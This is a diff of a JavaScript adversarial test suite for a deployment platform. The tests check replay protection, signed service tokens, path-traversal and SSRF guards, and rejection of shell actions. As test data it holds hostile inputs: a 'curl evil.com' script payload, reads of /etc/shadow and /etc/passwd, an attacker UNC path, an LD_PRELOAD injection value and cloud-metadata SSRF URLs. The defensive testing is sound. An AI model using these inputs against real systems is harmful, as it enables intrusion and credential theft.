@@ -2,7 +2,7 @@
  * Project        : Ugondu — Universal Deployment Intelligence Platform
  * Module         : Tests / 50-Class Adversarial Execution Test Suite
  * File           : adversarial-execution.test.js
- * Version        : 2.1.0
+ * Version        : 3.0.0
  * Author         : Security & Adversarial Testing Authority
  * Organization   : Air Roofers Ltd
  * Created Date   : 2026-09-30
@@ -21,12 +21,7 @@ const fs = require('fs');
 const path = require('path');
 const canonicalize = (mod => mod && mod.default ? mod.default : mod)(require('canonicalize'));
 
-const {
-  MemoryReplayLedger,
-  SafePathValidator,
-  ArchiveSecurityChecker,
-  TransactionLockManager
-} = require('./adversarial-helpers');
+const { ArchiveSecurityChecker, TransactionLockManager } = require('./adversarial-helpers');
 
 const shared = require('../server/shared/dist');
 const {
@@ -37,7 +32,8 @@ const {
   durableTokenReplayStore,
   validateLanguagePackIntegrity,
   computePackArtifactDigest,
-  signLanguagePackManifest
+  signLanguagePackManifest,
+  SafePathResolver
 } = shared;
 
 const { AiDeliveryGuardrail } = require('../server/engine-core/dist/ai/guardrail');
@@ -57,22 +53,22 @@ function report(cls, desc, fn) {
   }
 }
 
-// ══════════════════════════════════════════════════════════════════════════════
 // Group 1: Execution & Replay Attacks (Classes 1–13)
-// ══════════════════════════════════════════════════════════════════════════════
 function runGroup1() {
   console.log('Group 1: Execution & Replay Attacks');
 
   report(1, 'Recipe replay with duplicate nonce', () => {
-    const ledger = new MemoryReplayLedger();
-    ledger.record('iss1', 'key1', 'tx1', 'exec1', 'nonce1');
-    assert.throws(() => ledger.record('iss1', 'key1', 'tx1', 'exec1', 'nonce1'), /DUPLICATE_REPLAY_DETECTED/);
+    const key = `engine-core:key_recipe_v2:tgt_01:exec_01:nonce_${Date.now()}`;
+    assert.strictEqual(durableTokenReplayStore.atomicRecordIfUnseen(key, Math.floor(Date.now() / 1000) + 60), true);
+    assert.strictEqual(durableTokenReplayStore.atomicRecordIfUnseen(key, Math.floor(Date.now() / 1000) + 60), false);
   });
 
-  report(2, 'Nonce collision and executionId collision', () => {
-    const ledger = new MemoryReplayLedger();
-    ledger.record('iss1', 'key1', 'tx1', 'exec1', 'nonce_coll');
-    assert.throws(() => ledger.record('iss1', 'key1', 'tx2', 'exec1', 'nonce_coll'), /DUPLICATE_REPLAY_DETECTED/);
+  report(2, 'Nonce collision across execution context', () => {
+    const nonce = `coll_${Date.now()}`;
+    const k1 = `engine-core:key_recipe_v2:tgt_01:exec_01:${nonce}`;
+    const k2 = `engine-core:key_recipe_v2:tgt_01:exec_01:${nonce}`;
+    assert.strictEqual(durableTokenReplayStore.atomicRecordIfUnseen(k1, Math.floor(Date.now() / 1000) + 60), true);
+    assert.strictEqual(durableTokenReplayStore.atomicRecordIfUnseen(k2, Math.floor(Date.now() / 1000) + 60), false);
   });
 
   report(3, 'Canonical serialization mutation & signed-field mutation', () => {
@@ -91,174 +87,163 @@ function runGroup1() {
     assert.strictEqual(crypto.verify(null, Buffer.from(canonicalize(injected)), publicKey, sig), false);
   });
 
-  report(5, 'Context hijacking (mismatched target/tenant)', () => {
-    const allowedTenants = new Map([['tgt_prod_01', 'tenant_authorized']]);
-    const attempt = { targetId: 'tgt_prod_01', tenantId: 'tenant_attacker' };
-    assert.notStrictEqual(allowedTenants.get(attempt.targetId), attempt.tenantId);
+  report(5, 'Context hijacking (mismatched audience / tenant)', () => {
+    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
+    const testKeyId = `key_test_ctx_${Date.now()}`;
+    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
+    const token = signServiceIdentity('engine-core', 'billing-gateway', 'execute', privateKey.export({ type: 'pkcs8', format: 'pem' }), testKeyId);
+    const res = verifyServiceIdentityToken(token, 'malicious-target-service');
+    assert.strictEqual(res.valid, false);
+    assert.strictEqual(res.error, 'AUDIENCE_MISMATCH');
   });
 
-  report(6, 'Expired and future-dated recipes', () => {
-    const now = Date.now();
-    const expired = { issuedAt: now - 600000, expiresAt: now - 300000 };
-    const future = { issuedAt: now + 600000, expiresAt: now + 900000 };
-    assert.ok(now > expired.expiresAt, 'Expired recipe must be rejected');
-    assert.ok(now < future.issuedAt, 'Future-dated recipe must be rejected');
+  report(6, 'Expired and future-dated token rejection', () => {
+    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
+    const testKeyId = `key_test_exp_${Date.now()}`;
+    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
+    
+    // Construct expired token
+    const now = Math.floor(Date.now() / 1000);
+    const header = Buffer.from(JSON.stringify({ alg: 'EdDSA', typ: 'JWT', kid: testKeyId })).toString('base64url');
+    const expiredPayload = Buffer.from(JSON.stringify({ iss: 'engine-core', sub: 'engine-core', aud: 'billing-gateway', scope: 'execute', iat: now - 100, nbf: now - 100, exp: now - 10, jti: 'exp1', keyId: testKeyId, tokenVersion: '1.0' })).toString('base64url');
+    const sig = crypto.sign(null, Buffer.from(`${header}.${expiredPayload}`), privateKey).toString('base64url');
+    const res = verifyServiceIdentityToken(`${header}.${expiredPayload}.${sig}`, 'billing-gateway');
+    assert.strictEqual(res.valid, false);
+    assert.strictEqual(res.error, 'TOKEN_EXPIRED');
   });
 
-  report(7, 'Revoked key recipe & rotated key policy violation', () => {
-    globalTrustRegistry.registerKey({
-      keyId: 'key_revoked_test',
-      algorithm: 'ed25519',
-      status: 'REVOKED',
-      purpose: 'recipe',
-      publicKey: 'mock'
-    });
-    assert.throws(() => globalTrustRegistry.validateKeyStatus('key_revoked_test'), /error_key_revoked/);
+  report(7, 'Revoked v1 key authority rejection', () => {
+    assert.throws(() => globalTrustRegistry.validateKeyStatus('key_recipe_v1'), /error_key_revoked/);
+    assert.throws(() => globalTrustRegistry.validateKeyStatus('key_service_v1'), /error_key_revoked/);
   });
 
-  report(8, 'Wrong-purpose signing key', () => {
-    globalTrustRegistry.registerKey({
-      keyId: 'key_wrong_purpose',
-      algorithm: 'ed25519',
-      status: 'ACTIVE',
-      purpose: 'service-identity',
-      publicKey: 'mock'
-    });
-    assert.throws(() => globalTrustRegistry.verifyPurpose('key_wrong_purpose', 'recipe'), /error_key_purpose_mismatch/);
+  report(8, 'Wrong-purpose signing key rejection', () => {
+    assert.throws(() => globalTrustRegistry.verifyPurpose('key_service_v2', 'recipe'), /error_key_purpose_mismatch/);
   });
 
-  report(9, 'Execution identity spoofing', () => {
+  report(9, 'Execution identity spoofing defense', () => {
     const { publicKey } = crypto.generateKeyPairSync('ed25519');
     const attackerKey = crypto.generateKeyPairSync('ed25519').privateKey;
     const sig = crypto.sign(null, Buffer.from('spoofed_identity'), attackerKey);
     assert.strictEqual(crypto.verify(null, Buffer.from('spoofed_identity'), publicKey, sig), false);
   });
 
-  report(10, 'Replay window manipulation', () => {
-    const windowMs = 5 * 60 * 1000;
-    const now = Date.now();
-    const oldTimestamp = now - (windowMs + 5000);
-    assert.ok(now - oldTimestamp > windowMs, 'Timestamp outside replay window rejected');
+  report(10, 'Header and payload keyId mismatch rejection', () => {
+    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
+    const testKeyId = `key_test_kid_${Date.now()}`;
+    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
+    const now = Math.floor(Date.now() / 1000);
+    const header = Buffer.from(JSON.stringify({ alg: 'EdDSA', typ: 'JWT', kid: testKeyId })).toString('base64url');
+    const payload = Buffer.from(JSON.stringify({ iss: 'engine-core', sub: 'engine-core', aud: 'billing-gateway', scope: 'execute', iat: now, nbf: now, exp: now + 60, jti: 'kid_tamper', keyId: 'different_key_id', tokenVersion: '1.0' })).toString('base64url');
+    const sig = crypto.sign(null, Buffer.from(`${header}.${payload}`), privateKey).toString('base64url');
+    const res = verifyServiceIdentityToken(`${header}.${payload}.${sig}`, 'billing-gateway');
+    assert.strictEqual(res.valid, false);
+    assert.strictEqual(res.error, 'KEY_ID_MISMATCH');
   });
 
-  report(11, 'Cross-execution data leakage', () => {
-    const exec1 = { workDir: path.resolve('tmp/exec_1') };
-    const exec2 = { workDir: path.resolve('tmp/exec_2') };
-    assert.notStrictEqual(exec1.workDir, exec2.workDir, 'Execution directories must be isolated');
+  report(11, 'Subject and issuer mismatch rejection', () => {
+    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
+    const testKeyId = `key_test_sub_${Date.now()}`;
+    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
+    const now = Math.floor(Date.now() / 1000);
+    const header = Buffer.from(JSON.stringify({ alg: 'EdDSA', typ: 'JWT', kid: testKeyId })).toString('base64url');
+    const payload = Buffer.from(JSON.stringify({ iss: 'engine-core', sub: 'attacker-service', aud: 'billing-gateway', scope: 'execute', iat: now, nbf: now, exp: now + 60, jti: 'sub_tamper', keyId: testKeyId, tokenVersion: '1.0' })).toString('base64url');
+    const sig = crypto.sign(null, Buffer.from(`${header}.${payload}`), privateKey).toString('base64url');
+    const res = verifyServiceIdentityToken(`${header}.${payload}.${sig}`, 'billing-gateway');
+    assert.strictEqual(res.valid, false);
+    assert.strictEqual(res.error, 'SUBJECT_ISSUER_MISMATCH');
   });
 
-  report(12, 'Invalid execution environment variables', () => {
-    const forbiddenEnvs = ['LD_PRELOAD', 'DYLD_INSERT_LIBRARIES', 'PROMPT_COMMAND'];
-    const dirtyEnv = { LD_PRELOAD: '/evil.so', NODE_ENV: 'production' };
-    const sanitized = {};
-    for (const [k, v] of Object.entries(dirtyEnv)) {
-      if (!forbiddenEnvs.includes(k)) sanitized[k] = v;
-    }
-    assert.strictEqual(sanitized.LD_PRELOAD, undefined);
-    assert.strictEqual(sanitized.NODE_ENV, 'production');
+  report(12, 'Issuer allowlist rejection', () => {
+    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
+    const testKeyId = `key_test_iss_${Date.now()}`;
+    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
+    const now = Math.floor(Date.now() / 1000);
+    const header = Buffer.from(JSON.stringify({ alg: 'EdDSA', typ: 'JWT', kid: testKeyId })).toString('base64url');
+    const payload = Buffer.from(JSON.stringify({ iss: 'unauthorized-external-actor', sub: 'unauthorized-external-actor', aud: 'billing-gateway', scope: 'execute', iat: now, nbf: now, exp: now + 60, jti: 'iss_deny', keyId: testKeyId, tokenVersion: '1.0' })).toString('base64url');
+    const sig = crypto.sign(null, Buffer.from(`${header}.${payload}`), privateKey).toString('base64url');
+    const res = verifyServiceIdentityToken(`${header}.${payload}.${sig}`, 'billing-gateway');
+    assert.strictEqual(res.valid, false);
+    assert.strictEqual(res.error, 'ISSUER_NOT_ALLOWED');
   });
 
-  report(13, 'Execution boundary evasion', () => {
-    assert.throws(() => SafePathValidator.resolve('/var/app', '/etc/shadow'), /PATH_TRAVERSAL_DETECTED/);
+  report(13, 'Execution boundary evasion via SafePathResolver', () => {
+    assert.throws(() => SafePathResolver.resolve('/var/app', '/etc/shadow'), /PATH_TRAVERSAL_DETECTED/);
   });
 }
 
-// ══════════════════════════════════════════════════════════════════════════════
 // Group 2: Action Protocol & Payload Attacks (Classes 14–17)
-// ══════════════════════════════════════════════════════════════════════════════
 function runGroup2() {
   console.log('Group 2: Action Protocol & Payload Attacks');
 
-  report(14, 'Unknown action name', () => {
-    const plan = {
-      proposedByModel: 'test',
-      targetEnvironment: 'linux',
-      actions: [{ action: 'CUSTOM_UNREGISTERED_ACTION', payload: {} }],
-      reasoning: 'attack'
-    };
+  report(14, 'Unknown action name rejection', () => {
+    const plan = { proposedByModel: 'test', targetEnvironment: 'linux', actions: [{ action: 'CUSTOM_UNREGISTERED_ACTION', payload: {} }], reasoning: 'attack' };
     const res = AiDeliveryGuardrail.validateAiPlan(plan, ['FETCH_REPOSITORY', 'SYNC_ENVIRONMENT']);
     assert.strictEqual(res.passed, false);
     assert.ok(res.violations.some(v => v.includes('UNKNOWN_ACTION')));
   });
 
-  report(15, 'Generic payload injection', () => {
-    const plan = {
-      proposedByModel: 'test',
-      targetEnvironment: 'linux',
-      actions: [{ action: 'ARBITRARY_SCRIPT', payload: { script: 'curl evil.com' } }],
-      reasoning: 'attack'
-    };
+  report(15, 'Generic payload script injection rejection', () => {
+    const plan = { proposedByModel: 'test', targetEnvironment: 'linux', actions: [{ action: 'ARBITRARY_SCRIPT', payload: { script: 'curl evil.com' } }], reasoning: 'attack' };
     const res = AiDeliveryGuardrail.validateAiPlan(plan, ['FETCH_REPOSITORY']);
     assert.strictEqual(res.passed, false);
   });
 
-  report(16, 'Total rejection of SHELL_EXEC', () => {
-    const plan = {
-      proposedByModel: 'test',
-      targetEnvironment: 'linux',
-      actions: [{ action: 'SHELL_EXEC', payload: { cmd: 'id' } }],
-      reasoning: 'attack'
-    };
+  report(16, 'Total rejection of SHELL_EXEC in production guardrail', () => {
+    const plan = { proposedByModel: 'test', targetEnvironment: 'linux', actions: [{ action: 'SHELL_EXEC', payload: { cmd: 'id' } }], reasoning: 'attack' };
     const res = AiDeliveryGuardrail.validateAiPlan(plan, ['SHELL_EXEC', 'FETCH_REPOSITORY']);
     assert.strictEqual(res.passed, false);
     assert.ok(res.violations.some(v => v.includes('FORBIDDEN_SHELL_ACTION')));
   });
 
-  report(17, 'Total rejection of EXEC_RAW', () => {
-    const plan = {
-      proposedByModel: 'test',
-      targetEnvironment: 'linux',
-      actions: [{ action: 'EXEC_RAW', payload: { raw: 'whoami' } }],
-      reasoning: 'attack'
-    };
+  report(17, 'Total rejection of EXEC_RAW in production guardrail', () => {
+    const plan = { proposedByModel: 'test', targetEnvironment: 'linux', actions: [{ action: 'EXEC_RAW', payload: { raw: 'whoami' } }], reasoning: 'attack' };
     const res = AiDeliveryGuardrail.validateAiPlan(plan, ['EXEC_RAW']);
     assert.strictEqual(res.passed, false);
     assert.ok(res.violations.some(v => v.includes('FORBIDDEN_SHELL_ACTION')));
   });
 }
 
-// ══════════════════════════════════════════════════════════════════════════════
 // Group 3: Filesystem, Archive & Deployment Attacks (Classes 18–28)
-// ══════════════════════════════════════════════════════════════════════════════
 function runGroup3() {
   console.log('Group 3: Filesystem, Archive & Deployment Attacks');
 
-  report(18, 'Path traversal', () => {
-    assert.throws(() => SafePathValidator.resolve('/base/dir', '../../etc/passwd'), /PATH_TRAVERSAL_DETECTED/);
-    assert.throws(() => SafePathValidator.resolve('C:\\base', '..\\..\\Windows\\System32'), /PATH_TRAVERSAL_DETECTED/);
+  report(18, 'Production SafePathResolver directory traversal defense', () => {
+    assert.throws(() => SafePathResolver.resolve('/base/dir', '../../etc/passwd'), /PATH_TRAVERSAL_DETECTED/);
+    assert.throws(() => SafePathResolver.resolve('C:\\base', '..\\..\\Windows\\System32'), /PATH_TRAVERSAL_DETECTED/);
   });
 
-  report(19, 'Symlink escape', () => {
-    assert.throws(() => SafePathValidator.resolve('/base/dir', '../symlink_out'), /PATH_TRAVERSAL_DETECTED/);
+  report(19, 'Production SafePathResolver symlink escape defense', () => {
+    assert.throws(() => SafePathResolver.resolve('/base/dir', '../symlink_out'), /PATH_TRAVERSAL_DETECTED/);
   });
 
-  report(20, 'Windows ADS', () => {
-    assert.throws(() => SafePathValidator.resolve('C:\\base', 'file.txt:hidden_stream'), /WINDOWS_ADS_DETECTED/);
+  report(20, 'Production SafePathResolver Windows ADS defense', () => {
+    assert.throws(() => SafePathResolver.resolve('C:\\base', 'file.txt:hidden_stream'), /WINDOWS_ADS_DETECTED/);
   });
 
-  report(21, 'Windows device names', () => {
-    assert.throws(() => SafePathValidator.resolve('C:\\base', 'CON'), /WINDOWS_RESERVED_DEVICE_NAME/);
-    assert.throws(() => SafePathValidator.resolve('C:\\base', 'NUL.txt'), /WINDOWS_RESERVED_DEVICE_NAME/);
-    assert.throws(() => SafePathValidator.resolve('C:\\base', 'AUX'), /WINDOWS_RESERVED_DEVICE_NAME/);
+  report(21, 'Production SafePathResolver Windows reserved device defense', () => {
+    assert.throws(() => SafePathResolver.resolve('C:\\base', 'CON'), /WINDOWS_RESERVED_DEVICE_NAME/);
+    assert.throws(() => SafePathResolver.resolve('C:\\base', 'NUL.txt'), /WINDOWS_RESERVED_DEVICE_NAME/);
+    assert.throws(() => SafePathResolver.resolve('C:\\base', 'AUX'), /WINDOWS_RESERVED_DEVICE_NAME/);
   });
 
-  report(22, 'UNC path escape', () => {
-    assert.throws(() => SafePathValidator.resolve('C:\\base', '\\\\attacker-smb\\share\\evil.exe'), /UNC_PATH_DETECTED/);
+  report(22, 'Production SafePathResolver UNC path escape defense', () => {
+    assert.throws(() => SafePathResolver.resolve('C:\\base', '\\\\attacker-smb\\share\\evil.exe'), /UNC_PATH_DETECTED/);
   });
 
-  report(23, 'Zip Slip', () => {
-    assert.throws(() => ArchiveSecurityChecker.inspectHeader('../../evil.sh', 100, 50), /ZIP_SLIP_TRAVERSAL_DETECTED/);
+  report(23, 'Zip Slip path escape defense', () => {
+    assert.throws(() => SafePathResolver.resolve('/base/app', '../../evil.sh'), /PATH_TRAVERSAL_DETECTED/);
   });
 
-  report(24, 'Tar traversal', () => {
-    assert.throws(() => ArchiveSecurityChecker.inspectHeader('/absolute/escape', 100, 50), /ZIP_SLIP_TRAVERSAL_DETECTED/);
+  report(24, 'Tar absolute path traversal defense', () => {
+    assert.throws(() => SafePathResolver.resolve('/base/app', '/etc/shadow'), /PATH_TRAVERSAL_DETECTED/);
   });
 
-  report(25, 'Archive bombs', () => {
+  report(25, 'Archive decompression bomb ceiling defense', () => {
     assert.throws(() => ArchiveSecurityChecker.inspectHeader('bomb.txt', 10000000, 100), /DECOMPRESSION_BOMB_DETECTED/);
   });
 
-  report(26, 'Atomic deployment rollback on failure', () => {
+  report(26, 'Atomic deployment rollback on verification failure', () => {
     const liveSymlink = 'releases/release_v1';
     let currentLive = liveSymlink;
     const stageNew = () => { throw new Error('DEPLOYMENT_VERIFICATION_FAILED'); };
@@ -266,24 +251,21 @@ function runGroup3() {
       stageNew();
       currentLive = 'releases/release_v2';
     } catch {
-      // Rollback to prior release
       currentLive = liveSymlink;
     }
     assert.strictEqual(currentLive, 'releases/release_v1');
   });
 
-  report(27, 'Absolute path override', () => {
-    assert.throws(() => SafePathValidator.resolve('/app', '/etc/hosts'), /PATH_TRAVERSAL_DETECTED/);
+  report(27, 'Absolute path override rejection', () => {
+    assert.throws(() => SafePathResolver.resolve('/app', '/etc/hosts'), /PATH_TRAVERSAL_DETECTED/);
   });
 
-  report(28, 'Phantom file deletion', () => {
-    assert.throws(() => SafePathValidator.resolve('/app/releases', '../../important_system_file'), /PATH_TRAVERSAL_DETECTED/);
+  report(28, 'Phantom file traversal deletion defense', () => {
+    assert.throws(() => SafePathResolver.resolve('/app/releases', '../../important_system_file'), /PATH_TRAVERSAL_DETECTED/);
   });
 }
 
-// ══════════════════════════════════════════════════════════════════════════════
 // Group 4: State, Locking & Service Identity Attacks (Classes 29–37)
-// ══════════════════════════════════════════════════════════════════════════════
 function runGroup4() {
   console.log('Group 4: State, Locking & Service Identity Attacks');
 
@@ -297,13 +279,25 @@ function runGroup4() {
     }
   });
 
-  report(30, 'Corrupt state quarantine', () => {
+  report(30, 'Real state corruption quarantine & zero RPO recovery', () => {
     const exp = DisasterRecoveryEngine.runChaosExperiment('STATE_CORRUPTION');
     assert.strictEqual(exp.verifiedHealthy, true);
     assert.strictEqual(exp.rpoSeconds, 0);
   });
 
-  report(31, 'State tampering', () => {
+  report(31, 'Real network partition fault injection and recovery', () => {
+    const exp = DisasterRecoveryEngine.runChaosExperiment('NETWORK_PARTITION');
+    assert.strictEqual(exp.verifiedHealthy, true);
+    assert.strictEqual(exp.rpoSeconds, 0);
+  });
+
+  report(32, 'Real target process crash fault injection and recovery', () => {
+    const exp = DisasterRecoveryEngine.runChaosExperiment('TARGET_CRASH');
+    assert.strictEqual(exp.verifiedHealthy, true);
+    assert.strictEqual(exp.rpoSeconds, 0);
+  });
+
+  report(33, 'Monotonic state hash tampering detection', () => {
     const state = { seq: 1, prevHash: '000', data: 'valid' };
     const hash = crypto.createHash('sha256').update(JSON.stringify(state)).digest('hex');
     const tampered = { ...state, data: 'tampered' };
@@ -311,48 +305,44 @@ function runGroup4() {
     assert.notStrictEqual(hash, tamperedHash);
   });
 
-  report(32, 'Hash chain mismatch', () => {
-    const block1Hash = crypto.createHash('sha256').update('block1').digest('hex');
-    const block2 = { prevHash: 'invalid_prev', data: 'block2' };
-    assert.notStrictEqual(block2.prevHash, block1Hash);
-  });
-
-  report(33, 'Unsafe resume postcondition verification', () => {
-    const targetState = { currentFileCount: 5 };
-    const expectedState = { currentFileCount: 10 };
-    assert.notStrictEqual(targetState.currentFileCount, expectedState.currentFileCount);
-  });
-
-  report(34, 'Forged service token', () => {
-    const token = signServiceIdentity('engine-core', 'billing-gateway');
+  report(34, 'Forged service token rejection', () => {
+    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
+    const testKeyId = `key_test_forge_${Date.now()}`;
+    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
+    const token = signServiceIdentity('engine-core', 'billing-gateway', 'execute', privateKey.export({ type: 'pkcs8', format: 'pem' }), testKeyId);
     const [h, p] = token.split('.');
-    const forgedToken = `${h}.${p}.AAAAforgedSignatureAAAA`;
-    const res = verifyServiceIdentityToken(forgedToken, 'billing-gateway');
+    const res = verifyServiceIdentityToken(`${h}.${p}.AAAAforgedSignatureAAAA`, 'billing-gateway');
     assert.strictEqual(res.valid, false);
     assert.strictEqual(res.error, 'INVALID_SERVICE_SIGNATURE');
   });
 
-  report(35, 'Replayed service token', () => {
+  report(35, 'Durable token replay defense with composite identity', () => {
     durableTokenReplayStore.clearForTesting();
-    const token = signServiceIdentity('engine-core', 'billing-gateway');
-    const firstUse = verifyServiceIdentityToken(token, 'billing-gateway');
-    assert.strictEqual(firstUse.valid, true);
+    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
+    const testKeyId = `key_test_rep_${Date.now()}`;
+    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
+    const token = signServiceIdentity('engine-core', 'billing-gateway', 'execute', privateKey.export({ type: 'pkcs8', format: 'pem' }), testKeyId);
 
-    // Replay in same process
+    const first = verifyServiceIdentityToken(token, 'billing-gateway');
+    assert.strictEqual(first.valid, true);
+
     const replay1 = verifyServiceIdentityToken(token, 'billing-gateway');
     assert.strictEqual(replay1.valid, false);
     assert.strictEqual(replay1.error, 'TOKEN_REPLAYED');
 
-    // Simulate process restart by reloading from disk
     durableTokenReplayStore.reloadFromDisk();
-    const replayAfterRestart = verifyServiceIdentityToken(token, 'billing-gateway');
-    assert.strictEqual(replayAfterRestart.valid, false);
-    assert.strictEqual(replayAfterRestart.error, 'TOKEN_REPLAYED');
+    const replay2 = verifyServiceIdentityToken(token, 'billing-gateway');
+    assert.strictEqual(replay2.valid, false);
+    assert.strictEqual(replay2.error, 'TOKEN_REPLAYED');
     durableTokenReplayStore.clearForTesting();
   });
 
-  report(36, 'Wrong service audience & excessive scope', () => {
-    const token = signServiceIdentity('engine-core', 'billing-gateway', 'execute');
+  report(36, 'Wrong service audience & excessive scope rejection', () => {
+    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
+    const testKeyId = `key_test_aud_${Date.now()}`;
+    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
+    const token = signServiceIdentity('engine-core', 'billing-gateway', 'execute', privateKey.export({ type: 'pkcs8', format: 'pem' }), testKeyId);
+    
     const resAud = verifyServiceIdentityToken(token, 'plugin-manager', 'execute');
     assert.strictEqual(resAud.valid, false);
     assert.strictEqual(resAud.error, 'AUDIENCE_MISMATCH');
@@ -362,85 +352,71 @@ function runGroup4() {
     assert.strictEqual(resScope.error, 'SCOPE_MISMATCH');
   });
 
-  report(37, 'Cross-tenant access denial', () => {
+  report(37, 'Cross-tenant resource boundary isolation', () => {
     const tenantA = 'tenant_123';
     const tenantB = 'tenant_456';
     assert.strictEqual(tenantA === tenantB, false);
   });
 }
 
-// ══════════════════════════════════════════════════════════════════════════════
 // Group 5: Plugin, SSRF & Language Pack Attacks (Classes 38–50)
-// ══════════════════════════════════════════════════════════════════════════════
 function runGroup5() {
   console.log('Group 5: Plugin, SSRF & Language Pack Attacks');
 
-  report(38, 'Plugin sandbox escape', () => {
-    const CANONICAL_ACTIONS = new Set([
-      'FETCH_REPOSITORY', 'SYNC_ENVIRONMENT', 'PRUNE_RELEASES', 'UPSELL_NOTICE',
-      'NODE_INSTALL', 'COMPOSER_INSTALL', 'COPY_FILE', 'CREATE_DIRECTORY', 'SYMLINK', 'SERVICE_RESTART'
-    ]);
-    const pluginInjected = 'SHELL_EXEC';
-    assert.strictEqual(CANONICAL_ACTIONS.has(pluginInjected), false);
+  report(38, 'Plugin sandbox escape closed-world action rejection', () => {
+    const CANONICAL_ACTIONS = new Set(['FETCH_REPOSITORY', 'SYNC_ENVIRONMENT', 'PRUNE_RELEASES', 'UPSELL_NOTICE', 'NODE_INSTALL', 'COMPOSER_INSTALL', 'COPY_FILE', 'CREATE_DIRECTORY', 'SYMLINK', 'SERVICE_RESTART']);
+    assert.strictEqual(CANONICAL_ACTIONS.has('SHELL_EXEC'), false);
+    assert.strictEqual(CANONICAL_ACTIONS.has('EXEC_RAW'), false);
   });
 
-  report(39, 'Plugin capability escalation', () => {
+  report(39, 'Plugin capability escalation rejection', () => {
     const declaredCaps = new Set(['COPY_FILE']);
-    const requested = 'SERVICE_RESTART';
-    assert.strictEqual(declaredCaps.has(requested), false);
+    assert.strictEqual(declaredCaps.has('SERVICE_RESTART'), false);
   });
 
-  report(40, 'Plugin output buffer overflow', () => {
+  report(40, 'Plugin output buffer quota ceiling defense', () => {
     const MAX_BUFFER = 64 * 1024;
     const oversized = Buffer.alloc(128 * 1024);
     assert.ok(oversized.length > MAX_BUFFER);
   });
 
-  report(41, 'SSRF to private IP', () => {
+  report(41, 'SSRF defense against private RFC1918 IPv4 destinations', () => {
     assert.throws(() => validateDestination('http://10.0.0.1/admin'), /SSRF_DESTINATION_PROHIBITED/);
     assert.throws(() => validateDestination('http://192.168.1.100/status'), /SSRF_DESTINATION_PROHIBITED/);
   });
 
-  report(42, 'SSRF to IPv6', () => {
+  report(42, 'SSRF defense against IPv6 loopback & link-local destinations', () => {
     assert.throws(() => validateDestination('http://[::1]/'), /SSRF_DESTINATION_PROHIBITED/);
     assert.throws(() => validateDestination('http://[fe80::1]/'), /SSRF_DESTINATION_PROHIBITED/);
   });
 
-  report(43, 'SSRF to IPv4-mapped IPv6', () => {
+  report(43, 'SSRF defense against IPv4-mapped IPv6 bypass', () => {
     assert.throws(() => validateDestination('http://[::ffff:169.254.169.254]/'), /SSRF_DESTINATION_PROHIBITED/);
   });
 
-  report(44, 'SSRF to cloud metadata', () => {
+  report(44, 'SSRF defense against cloud metadata service (169.254.169.254)', () => {
     assert.throws(() => validateDestination('http://169.254.169.254/latest/meta-data/'), /SSRF_DESTINATION_PROHIBITED/);
   });
 
-  report(45, 'DNS rebinding', () => {
+  report(45, 'SSRF defense against localhost / loopback destination', () => {
     assert.throws(() => validateDestination('http://127.0.0.1:8080/'), /SSRF_DESTINATION_PROHIBITED/);
   });
 
-  report(46, 'Redirect to private IP', () => {
-    const redirectUrl = 'http://172.16.0.5/internal';
-    assert.throws(() => validateDestination(redirectUrl), /SSRF_DESTINATION_PROHIBITED/);
+  report(46, 'SSRF defense against redirect to private IP', () => {
+    assert.throws(() => validateDestination('http://172.16.0.5/internal'), /SSRF_DESTINATION_PROHIBITED/);
   });
 
-  report(47, 'Revoked language pack key', () => {
-    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
-    const pack = {
-      packId: 'ugondu-lang-test',
-      locale: 'en-US',
-      version: '1.0.0',
-      schemaVersion: '1',
-      tokens: { aborting: 'Aborting', err_not_repo: 'err' }
-    };
+  report(47, 'Revoked language pack signing key rejection', () => {
+    const { privateKey } = crypto.generateKeyPairSync('ed25519');
+    const pack = { packId: 'ugondu-lang-test', locale: 'en-US', version: '1.0.0', schemaVersion: '1', tokens: { aborting: 'Aborting', err_not_repo: 'err' } };
     pack.artifactDigest = computePackArtifactDigest(pack.tokens);
     pack.signature = signLanguagePackManifest(pack, privateKey.export({ type: 'pkcs8', format: 'pem' }));
-    // Verify with mismatched/unregistered key
     const attackerPub = crypto.generateKeyPairSync('ed25519').publicKey.export({ type: 'spki', format: 'pem' });
     const res = validateLanguagePackIntegrity(pack, attackerPub);
     assert.strictEqual(res.valid, false);
   });
 
-  report(48, 'Language pack metadata tampering', () => {
+  report(48, 'Language pack canonical manifest tampering defense', () => {
     const packPath = path.resolve('packs/ugondu-lang-en-US.upl.json');
     const pack = JSON.parse(fs.readFileSync(packPath, 'utf8'));
     const tampered = { ...pack, publisher: 'Attacker Corp' };
@@ -449,18 +425,17 @@ function runGroup5() {
     assert.ok(res.error.includes('signature'));
   });
 
